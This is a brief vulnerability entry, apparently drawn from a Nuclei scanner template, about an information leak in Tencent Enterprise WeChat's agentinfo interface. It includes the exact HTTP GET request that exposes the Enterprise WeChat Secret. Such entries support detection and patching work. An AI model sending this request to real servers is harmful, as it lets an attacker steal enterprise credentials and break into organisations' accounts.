# Vulnerability: WeChat agentinfo - Information Exposure
**Classification:** WECHAT
**Source:** Nuclei Template (`wechat-info-leak.yaml`)

## Description
There is an information leakage vulnerability in the agentinfo interface of Tencent Enterprise WeChat. An attacker can obtain the Enterprise WeChat Secret through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cgi-bin/gateway/agentinfo HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

